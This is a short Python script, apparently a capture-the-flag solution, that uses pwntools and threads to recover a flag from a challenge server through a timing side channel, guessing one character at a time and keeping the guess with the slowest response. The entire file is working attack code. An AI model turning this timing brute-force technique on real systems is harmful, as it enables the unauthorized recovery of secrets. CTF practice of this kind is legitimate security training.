from pwn import remote
from datetime import datetime
from datetime import timedelta
import threading

charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

ans = ""
result = {}

def testConnect(string) :
  begin = datetime.now()

  r = remote('hackme.inndy.tw', 7708)
  r.recvuntil('?')
  r.sendline("FLAG{" + string + "}")
  r.recvline()
  r.close()

  end = datetime.now()
  
  f.write(string + " : ")
  f.write(str(end - begin) + "\n")

  global result
  result[string] = end - begin

while True :
  f = open("output.txt", "a")
  
  threads = []
  result = {}
  average = timedelta(0)
  ansTime = timedelta(0)

  for i in range(len(charset)) :
    temp = ans + charset[i]
    threads.append(threading.Thread(target = testConnect, args = (temp,)))
    threads[i].start()

  for i in range(len(charset)) :
    threads[i].join()

  for key, value in result.items() :
     average = average + value
  ansTime = average / len(result)
  
  for key, value in result.items() :
    if value > ansTime : 
      ans = key
      ansTime = value
  print ans  
  f.write("==========\n")
  f.close()

  

